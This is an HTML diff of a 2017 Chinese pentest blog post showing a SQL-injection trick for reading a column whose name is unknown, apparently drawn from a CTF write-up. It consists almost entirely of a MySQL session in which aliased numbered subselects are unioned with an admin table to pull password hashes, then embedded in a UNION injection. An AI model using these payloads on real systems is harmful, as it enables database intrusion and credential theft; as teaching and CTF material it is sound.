@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+        <meta charset="utf-8" />
+        <title>SQL注入绕过未知字段名的技巧</title>
+        <link rel="stylesheet" href="/theme/css/main.css" />
+</head>
+
+<body id="index" class="home">
+        <header id="banner" class="body">
+                <h1><a href="/">Follow Your Heart </a></h1>
+                <nav><ul>
+                    <li><a href="/category/pentest.html">Pentest</a></li>
+                    <li><a href="/category/learning.html">Learning</a></li>
+                    <li><a href="/category/python.html">Python</a></li>
+                    <li><a href="/pages/tips.html">Tips</a></li>
+                    <li><a href="/pages/bash.html">Bash</a></li>
+                    <li><a href="/pages/question.html">Question</a></li>
+                    <li><a href="/pages/reverse-shell.html">各种姿势的反弹shell</a></li>
+                </ul></nav>
+        </header><!-- /#banner -->
+<section id="content" class="body">
+  <article>
+    <header>
+      <h1 class="entry-title">
+        <a href="/sql-bypass-unknown.html" rel="bookmark"
+           title="Permalink to SQL注入绕过未知字段名的技巧">SQL注入绕过未知字段名的技巧</a></h1>
+    </header>
+<footer class="post-info">
+        <span class="published" title="2017-11-28T00:00:00+01:00">
+                <a href='#'>11/28/2017 </a>
+                <a href="/category/sql.html">SQL</a>
+        </span>
+
+
+
+</footer><!-- /.post-info -->
+    <div class="entry-content">
+      
+      <p><a href="http://blog.7ell.me/2017/05/30/2017-DDCTF-SQL注入之过滤列名get数据/">http://blog.7ell.me/2017/05/30/2017-DDCTF-SQL注入之过滤列名get数据/</a> </p>
+<div class="highlight"><pre><span></span><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="mi">1</span><span class="p">)</span><span class="n">a</span><span class="p">,(</span><span class="k">select</span> <span class="mi">2</span><span class="p">)</span><span class="n">b</span><span class="p">,(</span><span class="k">select</span> <span class="mi">3</span><span class="p">)</span><span class="k">c</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">---+---+---+</span>
+<span class="o">|</span> <span class="mi">1</span> <span class="o">|</span> <span class="mi">2</span> <span class="o">|</span> <span class="mi">3</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">---+---+---+</span>
+<span class="o">|</span> <span class="mi">1</span> <span class="o">|</span> <span class="mi">2</span> <span class="o">|</span> <span class="mi">3</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">---+---+---+</span>
+<span class="mi">1</span> <span class="k">row</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>
+
+<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="mi">1</span><span class="p">)</span><span class="n">a</span><span class="p">,(</span><span class="k">select</span> <span class="mi">2</span><span class="p">)</span><span class="n">b</span><span class="p">,(</span><span class="k">select</span> <span class="mi">3</span><span class="p">)</span><span class="k">c</span> <span class="k">union</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="k">admin</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">---+--------+----------------------------------+</span>
+<span class="o">|</span> <span class="mi">1</span> <span class="o">|</span> <span class="mi">2</span>      <span class="o">|</span> <span class="mi">3</span>                                <span class="o">|</span>
+<span class="o">+</span><span class="c1">---+--------+----------------------------------+</span>
+<span class="o">|</span> <span class="mi">1</span> <span class="o">|</span> <span class="mi">2</span>      <span class="o">|</span> <span class="mi">3</span>                                <span class="o">|</span>
+<span class="o">|</span> <span class="mi">1</span> <span class="o">|</span> <span class="k">admin</span>  <span class="o">|</span> <span class="n">e10adc3949ba59abbe56e057f20f883e</span> <span class="o">|</span>
+<span class="o">|</span> <span class="mi">2</span> <span class="o">|</span> <span class="n">admin2</span> <span class="o">|</span> <span class="mi">7195</span><span class="n">ca99696b5a896d067a0fa9dc61a6</span> <span class="o">|</span>
+<span class="o">|</span> <span class="mi">3</span> <span class="o">|</span> <span class="n">admin3</span> <span class="o">|</span> <span class="mi">7195</span><span class="k">C</span>                            <span class="o">|</span>
+<span class="o">+</span><span class="c1">---+--------+----------------------------------+</span>
+<span class="mi">4</span> <span class="k">rows</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>
+
+<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="n">e</span><span class="p">.</span><span class="mi">3</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="mi">1</span><span class="p">)</span><span class="n">a</span><span class="p">,(</span><span class="k">select</span> <span class="mi">2</span><span class="p">)</span><span class="n">b</span><span class="p">,(</span><span class="k">select</span> <span class="mi">3</span><span class="p">)</span><span class="k">c</span> <span class="k">union</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="k">admin</span><span class="p">)</span><span class="n">e</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">----------------------------------+</span>
+<span class="o">|</span> <span class="mi">3</span>                                <span class="o">|</span>
+<span class="o">+</span><span class="c1">----------------------------------+</span>
+<span class="o">|</span> <span class="mi">3</span>                                <span class="o">|</span>
+<span class="o">|</span> <span class="n">e10adc3949ba59abbe56e057f20f883e</span> <span class="o">|</span>
+<span class="o">|</span> <span class="mi">7195</span><span class="n">ca99696b5a896d067a0fa9dc61a6</span> <span class="o">|</span>
+<span class="o">|</span> <span class="mi">7195</span><span class="k">C</span>                            <span class="o">|</span>
+<span class="o">+</span><span class="c1">----------------------------------+</span>
+<span class="mi">4</span> <span class="k">rows</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>
+
+<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="n">e</span><span class="p">.</span><span class="mi">3</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="mi">1</span><span class="p">)</span><span class="n">a</span><span class="p">,(</span><span class="k">select</span> <span class="mi">2</span><span class="p">)</span><span class="n">b</span><span class="p">,(</span><span class="k">select</span> <span class="mi">3</span><span class="p">)</span><span class="k">c</span> <span class="k">union</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="k">admin</span><span class="p">)</span><span class="n">e</span> <span class="k">limit</span> <span class="mi">1</span> <span class="k">offset</span> <span class="mi">3</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">-------+</span>
+<span class="o">|</span> <span class="mi">3</span>     <span class="o">|</span>
+<span class="o">+</span><span class="c1">-------+</span>
+<span class="o">|</span> <span class="mi">7195</span><span class="k">C</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">-------+</span>
+<span class="mi">1</span> <span class="k">row</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>
+
+<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="k">admin</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">union</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+</span>
+<span class="o">|</span> <span class="n">id</span> <span class="o">|</span> <span class="n">username</span> <span class="o">|</span> <span class="n">password</span>                         <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+</span>
+<span class="o">|</span>  <span class="mi">1</span> <span class="o">|</span> <span class="k">admin</span>    <span class="o">|</span> <span class="n">e10adc3949ba59abbe56e057f20f883e</span> <span class="o">|</span>
+<span class="o">|</span>  <span class="mi">1</span> <span class="o">|</span> <span class="mi">2</span>        <span class="o">|</span> <span class="mi">3</span>                                <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+</span>
+<span class="mi">2</span> <span class="k">rows</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">01</span> <span class="n">sec</span><span class="p">)</span>
+
+<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="k">admin</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">union</span> <span class="k">select</span> <span class="p">(</span><span class="k">select</span> <span class="n">e</span><span class="p">.</span><span class="mi">3</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="mi">1</span><span class="p">)</span><span class="n">a</span><span class="p">,(</span><span class="k">select</span> <span class="mi">2</span><span class="p">)</span><span class="n">b</span><span class="p">,(</span><span class="k">select</span> <span class="mi">3</span><span class="p">)</span><span class="k">c</span> <span class="k">union</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="k">admin</span><span class="p">)</span><span class="n">e</span> <span class="k">limit</span> <span class="mi">1</span> <span class="k">offset</span> <span class="mi">3</span><span class="p">),</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">-------+----------+----------------------------------+</span>
+<span class="o">|</span> <span class="n">id</span>    <span class="o">|</span> <span class="n">username</span> <span class="o">|</span> <span class="n">password</span>                         <span class="o">|</span>
+<span class="o">+</span><span class="c1">-------+----------+----------------------------------+</span>
+<span class="o">|</span> <span class="mi">1</span>     <span class="o">|</span> <span class="k">admin</span>    <span class="o">|</span> <span class="n">e10adc3949ba59abbe56e057f20f883e</span> <span class="o">|</span>
+<span class="o">|</span> <span class="mi">7195</span><span class="k">C</span> <span class="o">|</span> <span class="mi">2</span>        <span class="o">|</span> <span class="mi">3</span>                                <span class="o">|</span>
+<span class="o">+</span><span class="c1">-------+----------+----------------------------------+</span>
+<span class="mi">2</span> <span class="k">rows</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>
+</pre></div>
+    </div><!-- /.entry-content -->
+
+  </article>
+</section>
+        <section id="extras" class="body">
+        </section><!-- /#extras -->
+
+
+</body>
+</html>
